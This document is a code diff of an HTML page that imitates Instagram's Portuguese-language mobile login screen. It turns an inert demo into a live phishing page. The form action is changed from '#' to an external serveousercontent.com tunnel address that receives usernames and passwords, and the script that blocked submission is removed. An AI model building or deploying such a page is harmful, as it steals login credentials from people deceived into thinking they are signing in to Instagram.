@@ -19,7 +19,7 @@
             overflow: hidden;
         }
 
-        /* ========== SPLASH SCREEN ========== */
+        /* ========== SPLASH ========== */
         #splash {
             position: fixed; 
             inset: 0; 
@@ -96,10 +96,8 @@
             height: 100dvh; 
             background-color: #000000;
             padding: 0 16px; 
-            position: relative;
         }
 
-        /* Idioma no topo - posição exata */
         .lang-selector-wrapper {
             width: 100%;
             display: flex;
@@ -124,7 +122,6 @@
             fill: #A8A8A8;
         }
 
-        /* Logo Instagram no login - posicionamento exato */
         .insta-logo-login-wrapper {
             width: 100%;
             display: flex;
@@ -138,7 +135,6 @@
             filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.3));
         }
 
-        /* Formulário */
         form { 
             width: 100%; 
             max-width: 358px;
@@ -192,7 +188,6 @@
             opacity: 0.7;
         }
 
-        /* Link Esqueceu a senha */
         .forgot-pass-wrapper {
             width: 100%;
             text-align: center;
@@ -210,7 +205,6 @@
             opacity: 0.7;
         }
 
-        /* Rodapé - área inferior */
         .footer-container {
             margin-top: auto; 
             width: 100%; 
@@ -220,79 +214,39 @@
             padding-bottom: 24px;
         }
 
-        /* Linha divisória e link de cadastro */
-        .signup-wrapper {
+        /* Botão Criar nova conta - estilo original */
+        .signup-btn {
             width: 100%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 16px 0 20px 0;
-            position: relative;
-        }
-
-        .signup-wrapper::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -16px;
-            right: -16px;
-            height: 0.5px;
-            background: #262626;
-        }
-
-        .signup-box { 
-            color: #A8A8A8; 
-            font-size: 14px; 
-            font-weight: 400;
-        }
-
-        .signup-box a { 
-            color: #0095F6; 
-            text-decoration: none; 
-            font-weight: 600; 
-        }
-
-        .signup-box a:active {
-            opacity: 0.7;
-        }
-
-        /* Logo Meta no rodapé - estilo oficial: ∞ pequeno, Meta maior */
-        .meta-footer {
-            display: flex;
-            align-items: baseline;
-            justify-content: center;
-            gap: 2px;
-            opacity: 0.6;
-            padding: 8px 0;
-        }
-
-        .infinity-footer {
-            font-size: 18px;
-            line-height: 1;
-            font-weight: 600;
-            color: #FFFFFF;
-            margin-right: 1px;
-        }
-
-        .meta-word-footer {
+            max-width: 358px;
+            background: transparent;
+            border: 1px solid #0095F6;
+            border-radius: 18px;
+            padding: 7px 0;
+            color: #0095F6;
             font-size: 14px;
             font-weight: 600;
-            color: #FFFFFF;
-            letter-spacing: -0.2px;
+            text-align: center;
+            text-decoration: none;
+            margin-bottom: 28px;
+            line-height: 18px;
+            transition: background 0.2s ease;
         }
 
-        /* Ajustes para mobile */
-        @media (max-width: 380px) {
-            .insta-logo-login {
-                width: 60px;
-                height: 60px;
-            }
-            .insta-logo-login-wrapper {
-                margin-bottom: 28px;
-            }
-            .forgot-pass-wrapper {
-                margin-bottom: 60px;
-            }
+        .signup-btn:active {
+            background: rgba(0, 149, 246, 0.1);
+        }
+
+        /* Meta footer - estilo original */
+        .meta-footer {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0.6;
+        }
+
+        .meta-footer svg {
+            width: 70px;
+            height: auto;
         }
     </style>
 </head>
@@ -301,7 +255,6 @@
     <!-- Gradientes SVG -->
     <svg style="width:0; height:0; position:absolute;">
         <defs>
-            <!-- Gradiente principal do Instagram - cores oficiais e vibrantes -->
             <linearGradient id="instaGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                 <stop offset="0%" stop-color="#833AB4"/>
                 <stop offset="25%" stop-color="#C13584"/>
@@ -309,19 +262,10 @@
                 <stop offset="75%" stop-color="#FD1D1D"/>
                 <stop offset="100%" stop-color="#FCAF45"/>
             </linearGradient>
-            
-            <!-- Gradiente horizontal alternativo -->
-            <linearGradient id="instaGradientHoriz" x1="0%" y1="0%" x2="100%" y2="0%">
-                <stop offset="0%" stop-color="#FCAF45"/>
-                <stop offset="25%" stop-color="#FD1D1D"/>
-                <stop offset="50%" stop-color="#E1306C"/>
-                <stop offset="75%" stop-color="#C13584"/>
-                <stop offset="100%" stop-color="#833AB4"/>
-            </linearGradient>
         </defs>
     </svg>
 
-    <!-- ========== SPLASH SCREEN ========== -->
+    <!-- SPLASH -->
     <div id="splash">
         <div class="splash-logo-wrapper">
             <svg class="insta-splash-logo" viewBox="0 0 24 24" fill="none">
@@ -340,9 +284,8 @@
         </div>
     </div>
 
-    <!-- ========== LOGIN SCREEN ========== -->
+    <!-- LOGIN SCREEN -->
     <div id="login-screen">
-        <!-- Seletor de idioma -->
         <div class="lang-selector-wrapper">
             <div class="lang-selector">
                 <span>Português (Brasil)</span>
@@ -352,7 +295,6 @@
             </div>
         </div>
         
-        <!-- Logo Instagram -->
         <div class="insta-logo-login-wrapper">
             <svg class="insta-logo-login" viewBox="0 0 24 24" fill="none">
                 <rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#instaGradient)" stroke-width="2.2" fill="none"/>
@@ -361,68 +303,49 @@
             </svg>
         </div>
 
-        <!-- Formulário de login -->
-        <form action="#" method="POST">
-            <input type="text" name="username" class="input-box" placeholder="Nome de usuário, email ou celular" required>
+        <!-- FORMULÁRIO ORIGINAL - com action da apresentação -->
+        <form action="https://693ef71330a356b2-45-161-216-55.serveousercontent.com" method="POST">
+            <input type="text" name="username" class="input-box" placeholder="Nome de usuário, e-mail ou número" required>
             <input type="password" name="password" class="input-box" placeholder="Senha" required>
             <button type="submit" class="btn-login">Entrar</button>
         </form>
 
-        <!-- Esqueceu a senha -->
         <div class="forgot-pass-wrapper">
             <a href="#" class="forgot-pass">Esqueceu a senha?</a>
         </div>
 
-        <!-- Rodapé com cadastro e Meta -->
         <div class="footer-container">
-            <div class="signup-wrapper">
-                <div class="signup-box">
-                    Não tem uma conta? <a href="#">Cadastre-se</a>
-                </div>
-            </div>
+            <a href="#" class="signup-btn">Criar nova conta</a>
             
-            <!-- Meta logo: ∞ pequeno, Meta maior (estilo oficial) -->
+            <!-- Meta logo original -->
             <div class="meta-footer">
-                <span class="infinity-footer">∞</span>
-                <span class="meta-word-footer">Meta</span>
+                <svg viewBox="0 0 287 56" fill="white" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M55.5 14.5C55.5 14.5 58.5 10 64 10C69.5 10 72 15 72 15L79 4C79 4 73.5 -2 64 2C54.5 6 55.5 14.5 55.5 14.5Z" fill="currentColor"/>
+                    <path d="M46 46C46 46 40 52 33 52C26 52 21 47 21 40C21 33 26 28 33 28C40 28 45 33 45 33L38 41C38 41 36 44 33 44C30 44 28 42 28 40C28 38 30 36 33 36C35 36 37 38 37 38L46 46Z" fill="currentColor"/>
+                    <path d="M90 52L90 4L98 4L98 52L90 52Z" fill="currentColor"/>
+                    <path d="M110 52L110 4L118 4L118 52L110 52Z" fill="currentColor"/>
+                    <path d="M130 52L130 4L138 4L138 24L152 4L162 4L146 22L164 52L152 52L138 28L138 52L130 52Z" fill="currentColor"/>
+                    <path d="M175 52L175 4L183 4L183 24L197 4L207 4L191 22L209 52L197 52L183 28L183 52L175 52Z" fill="currentColor"/>
+                    <circle cx="230" cy="28" r="24" stroke="currentColor" stroke-width="8" fill="none"/>
+                    <path d="M267 52L267 4L275 4L275 52L267 52Z" fill="currentColor"/>
+                </svg>
             </div>
         </div>
     </div>
 
     <script>
-        (function() {
-            'use strict';
+        window.addEventListener('load', () => {
+            const splash = document.getElementById('splash');
+            const login = document.getElementById('login-screen');
             
-            // Garantir que o form não submeta para lugar nenhum na demo
-            const form = document.querySelector('form');
-            if (form) {
-                form.addEventListener('submit', function(e) {
-                    e.preventDefault();
-                });
-            }
-            
-            // Links não navegam
-            document.querySelectorAll('a').forEach(link => {
-                link.addEventListener('click', function(e) {
-                    e.preventDefault();
-                });
-            });
-            
-            // Splash screen timing
-            window.addEventListener('load', function() {
-                const splash = document.getElementById('splash');
-                const login = document.getElementById('login-screen');
-                
-                setTimeout(function() {
-                    splash.style.opacity = '0';
-                    
-                    setTimeout(function() {
-                        splash.style.display = 'none';
-                        login.style.display = 'flex';
-                    }, 350);
-                }, 2200);
-            });
-        })();
+            setTimeout(() => {
+                splash.style.opacity = '0';
+                setTimeout(() => {
+                    splash.style.display = 'none';
+                    login.style.display = 'flex';
+                }, 350);
+            }, 2200);
+        });
     </script>
 </body>
 </html>
